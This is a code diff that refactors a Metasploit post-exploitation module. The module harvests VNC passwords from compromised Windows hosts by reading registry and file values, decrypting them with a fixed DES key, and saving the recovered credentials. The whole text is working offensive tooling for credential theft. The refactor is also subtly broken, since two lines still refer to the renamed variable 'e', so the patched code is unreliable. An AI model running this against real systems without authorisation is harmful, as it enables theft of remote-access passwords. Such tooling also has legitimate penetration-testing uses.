@@ -23,6 +23,11 @@ class MetasploitModule < Msf::Post
         ],
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -41,9 +46,7 @@ class MetasploitModule < Msf::Post
   end
 
   def decrypt_hash(hash)
-    if hash.nil?
-      return nil
-    end
+    return if hash.nil?
 
     # fixed des key
     # 5A B2 CD C0 BA DC AF 13
@@ -69,38 +72,23 @@ class MetasploitModule < Msf::Post
     open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
 
     data = open_key.query_value(variable).data
-    if data.is_a? Integer
+    if data.is_a?(Integer)
       return data
-    else
-      value = data.unpack('H*')[0].to_s
-      return value
     end
+
+    value = data.unpack('H*')[0].to_s
+    return value
   rescue StandardError
     # Registry value not found
     return nil
   end
 
   def run
-    '
-  Hash format
-    :name,
-    :check_file,
-    :check_reg,
-    :pass_variable,
-    :port_variable,
-    :port,
-    :hash,
-    :pass,
-    :viewonly_variable,
-    :viewonly_hash,
-    :viewonly_pass
-  '
-
     locations = []
 
-    # Checks
+    # checks program files
     progfiles_env = session.sys.config.getenvs('ProgramFiles', 'ProgramFiles(x86)')
-    progfiles_env.each do |_k, v|
+    progfiles_env.each_value do |v|
       next if v.blank?
 
       locations << {
@@ -254,47 +242,50 @@ class MetasploitModule < Msf::Post
 
     print_status("Enumerating VNC passwords on #{sysinfo['Computer']}")
 
-    locations.map do |e|
-      vprint_status("Checking #{e[:name]}...")
+    locations.map do |location|
+      vprint_status("Checking #{location[:name]}...")
+
       if e.key?(:check_reg)
-        e[:port] = reg_get(e[:check_reg], e[:port_variable])
-        e[:hash] = reg_get(e[:check_reg], e[:pass_variable])
-        e[:pass] = decrypt_hash(e[:hash])
-        if e.key?(:viewonly_variable)
-          e[:viewonly_hash] = reg_get(e[:check_reg], e[:viewonly_variable])
-          e[:viewonly_pass] = decrypt_hash(e[:viewonly_hash])
+        location[:port] = reg_get(location[:check_reg], location[:port_variable])
+        location[:hash] = reg_get(location[:check_reg], location[:pass_variable])
+        location[:pass] = decrypt_hash(location[:hash])
+        if location.key?(:viewonly_variable)
+          location[:viewonly_hash] = reg_get(location[:check_reg], location[:viewonly_variable])
+          location[:viewonly_pass] = decrypt_hash(location[:viewonly_hash])
         end
-      elsif e.key?(:check_file)
-        e[:port] = file_get(e[:check_file], e[:port_variable])
-        e[:hash] = file_get(e[:check_file], e[:pass_variable])
-        e[:pass] = decrypt_hash(e[:hash])
-        if e.key?(:viewonly_variable)
-          e[:viewonly_hash] = file_get(e[:check_file], e[:viewonly_variable])
-          e[:viewonly_pass] = decrypt_hash(e[:viewonly_hash])
+      elsif location.key?(:check_file)
+        location[:port] = file_get(location[:check_file], location[:port_variable])
+        location[:hash] = file_get(location[:check_file], location[:pass_variable])
+        location[:pass] = decrypt_hash(location[:hash])
+        if location.key?(:viewonly_variable)
+          location[:viewonly_hash] = file_get(location[:check_file], location[:viewonly_variable])
+          location[:viewonly_pass] = decrypt_hash(location[:viewonly_hash])
         end
       end
-      # reporting
-      if !e[:pass].nil?
-        if e[:port].nil?
-          e[:port] = 5900
-        end
-        print_good("Location: #{e[:name]} => Hash: #{e[:hash]} => Password: #{e[:pass]} => Port: #{e[:port]}")
 
-        service_data = {
-          address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
-          port: e[:port],
-          service_name: 'vnc',
-          protocol: 'tcp',
-          workspace_id: myworkspace_id
-        }
+      next if location[:pass].nil? && location[:viewonly_pass].nil?
+
+      location[:port] = 5900 if location[:port].nil?
+
+      # reporting
+      service_data = {
+        address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
+        port: location[:port],
+        service_name: 'vnc',
+        protocol: 'tcp',
+        workspace_id: myworkspace_id,
+        origin_type: :session,
+        session_id: session_db_id,
+        post_reference_name: refname
+      }
+
+      if !e[:pass].nil?
+        print_good("Location: #{location[:name]} => Hash: #{location[:hash]} => Password: #{location[:pass]} => Port: #{location[:port]}")
 
         # Assemble data about the credential objects we will be creating
         credential_data = {
-          origin_type: :session,
-          session_id: session_db_id,
-          post_reference_name: refname,
           private_type: :password,
-          private_data: (e[:pass]).to_s
+          private_data: location[:pass].to_s
         }
 
         # Merge the service data into the credential data
@@ -312,28 +303,17 @@ class MetasploitModule < Msf::Post
 
         # Merge in the service data and create our Login
         login_data.merge!(service_data)
-        login = create_credential_login(login_data)
-
+        create_credential_login(login_data)
       end
-      next if e[:viewonly_pass].nil?
 
-      print_good("VIEW ONLY: #{e[:name]} => #{e[:viewonly_hash]} => #{e[:viewonly_pass]} on port: #{e[:port]}")
+      next if location[:viewonly_pass].nil?
 
-      service_data = {
-        address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
-        port: e[:port],
-        service_name: 'vnc',
-        protocol: 'tcp',
-        workspace_id: myworkspace_id
-      }
+      print_good("VIEW ONLY: #{location[:name]} => #{location[:viewonly_hash]} => #{location[:viewonly_pass]} on port: #{location[:port]}")
 
       # Assemble data about the credential objects we will be creating
       credential_data = {
-        origin_type: :session,
-        session_id: session_db_id,
-        post_reference_name: refname,
         private_type: :password,
-        private_data: (e[:viewonly_pass]).to_s
+        private_data: location[:viewonly_pass].to_s
       }
 
       # Merge the service data into the credential data
@@ -351,8 +331,9 @@ class MetasploitModule < Msf::Post
 
       # Merge in the service data and create our Login
       login_data.merge!(service_data)
-      login = create_credential_login(login_data)
+      create_credential_login(login_data)
     end
+
     unload_our_hives(userhives)
   end
 end
